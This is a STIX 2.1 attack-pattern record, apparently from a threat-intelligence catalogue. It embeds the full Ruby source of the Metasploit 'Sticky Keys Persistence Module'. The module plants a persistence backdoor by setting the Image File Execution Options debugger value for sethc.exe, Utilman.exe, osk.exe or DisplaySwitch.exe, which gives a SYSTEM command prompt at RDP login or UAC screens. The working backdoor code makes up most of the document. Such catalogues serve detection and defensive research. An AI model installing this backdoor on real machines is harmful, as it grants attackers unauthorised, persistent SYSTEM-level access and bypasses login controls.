{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1c828f3d-6b1f-4d33-a133-06dcd9fba3aa",
    "created": "2024-08-14T16:33:04.978341Z",
    "modified": "2024-08-14T16:33:04.978344Z",
    "name": "Sticky Keys Persistence Module",
    "description": " This module makes it possible to apply the 'sticky keys' hack to a session with appropriate rights. The hack provides a means to get a SYSTEM shell using UI-level interaction at an RDP login screen or via a UAC confirmation dialog. The module modifies the Debug registry setting for certain executables.  The module options allow for this hack to be applied to:  SETHC   (sethc.exe is invoked when SHIFT is pressed 5 times) UTILMAN (Utilman.exe is invoked by pressing WINDOWS+U) OSK     (osk.exe is invoked by pressing WINDOWS+U, then launching the on-screen keyboard), and DISP    (DisplaySwitch.exe is invoked by pressing WINDOWS+P).  The hack can be added using the ADD action, and removed with the REMOVE action.  Custom payloads and binaries can be run as part of this exploit, but must be manually uploaded to the target prior to running the module. By default, a SYSTEM command prompt is installed using the registry method if this module is run without modifying any parameters. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/sticky_keys.rb",
            "external_id": "sticky_keys.rb"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20170201184448/https://social.technet.microsoft.com/Forums/windows/en-US/a3968ec9-5824-4bc2-82a2-a37ea88c273a/sticky-keys-exploit"
        },
        {
            "source_name": "reference",
            "url": "https://blog.carnal0wnage.com/2012/04/privilege-escalation-via-sticky-keys.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::Registry\n  include Msf::Post::Windows::Priv\n\n  DEBUG_REG_PATH = 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options'\n  DEBUG_REG_VALUE = 'Debugger'\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Sticky Keys Persistence Module',\n        'Description' => %q{\n          This module makes it possible to apply the 'sticky keys' hack to a session with appropriate\n          rights. The hack provides a means to get a SYSTEM shell using UI-level interaction at an RDP\n          login screen or via a UAC confirmation dialog. The module modifies the Debug registry setting\n          for certain executables.\n\n          The module options allow for this hack to be applied to:\n\n          SETHC   (sethc.exe is invoked when SHIFT is pressed 5 times),\n          UTILMAN (Utilman.exe is invoked by pressing WINDOWS+U),\n          OSK     (osk.exe is invoked by pressing WINDOWS+U, then launching the on-screen keyboard), and\n          DISP    (DisplaySwitch.exe is invoked by pressing WINDOWS+P).\n\n          The hack can be added using the ADD action, and removed with the REMOVE action.\n\n          Custom payloads and binaries can be run as part of this exploit, but must be manually uploaded\n          to the target prior to running the module. By default, a SYSTEM command prompt is installed\n          using the registry method if this module is run without modifying any parameters.\n        },\n        'Author' => ['OJ Reeves'],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter', 'shell'],\n        'Actions' => [\n          ['ADD', { 'Description' => 'Add the backdoor to the target.' }],\n          ['REMOVE', { 'Description' => 'Remove the backdoor from the target.' }]\n        ],\n        'References' => [\n          ['URL', 'https://web.archive.org/web/20170201184448/https://social.technet.microsoft.com/Forums/windows/en-US/a3968ec9-5824-4bc2-82a2-a37ea88c273a/sticky-keys-exploit'],\n          ['URL', 'https://blog.carnal0wnage.com/2012/04/privilege-escalation-via-sticky-keys.html']\n        ],\n        'DefaultAction' => 'ADD'\n      )\n    )\n\n    register_options([\n      OptEnum.new('TARGET', [true, 'The target binary to add the exploit to.', 'SETHC', ['SETHC', 'UTILMAN', 'OSK', 'DISP']]),\n      OptString.new('EXE', [true, 'Executable to execute when the exploit is triggered.', '%SYSTEMROOT%\\system32\\cmd.exe'])\n    ])\n  end\n\n  #\n  # Returns the name of the executable to modify the debugger settings of.\n  #\n  def get_target_exe_name\n    case datastore['TARGET']\n    when 'UTILMAN'\n      'Utilman.exe'\n    when 'OSK'\n      'osk.exe'\n    when 'DISP'\n      'DisplaySwitch.exe'\n    else\n      'sethc.exe'\n    end\n  end\n\n  #\n  # Returns the key combinations required to invoke the exploit once installed.\n  #\n  def get_target_key_combo\n    case datastore['TARGET']\n    when 'UTILMAN'\n      'WINDOWS+U'\n    when 'OSK'\n      'WINDOWS+U, then launching the on-screen keyboard'\n    when 'DISP'\n      'WINDOWS+P'\n    else\n      'SHIFT 5 times'\n    end\n  end\n\n  #\n  # Returns the full path to the target's registry key based on the current target\n  # settings.\n  #\n  def get_target_exe_reg_key\n    \"#{DEBUG_REG_PATH}\\\\#{get_target_exe_name}\"\n  end\n\n  #\n  # Runs the exploit.\n  #\n  def run\n    unless is_admin?\n      fail_with(Failure::NoAccess, 'The current session does not have administrative rights.')\n    end\n\n    print_good('Session has administrative rights, proceeding.')\n\n    target_key = get_target_exe_reg_key\n\n    if action.name == 'ADD'\n      command = expand_path(datastore['EXE'])\n\n      registry_createkey(target_key)\n      registry_setvaldata(target_key, DEBUG_REG_VALUE, command, 'REG_SZ')\n\n      print_good(\"'Sticky keys' successfully added. Launch the exploit at an RDP or UAC prompt by pressing #{get_target_key_combo}.\")\n    else\n      registry_deletekey(target_key)\n      print_good(\"'Sticky keys' removed from registry key #{target_key}.\")\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "['win']"
    ]
}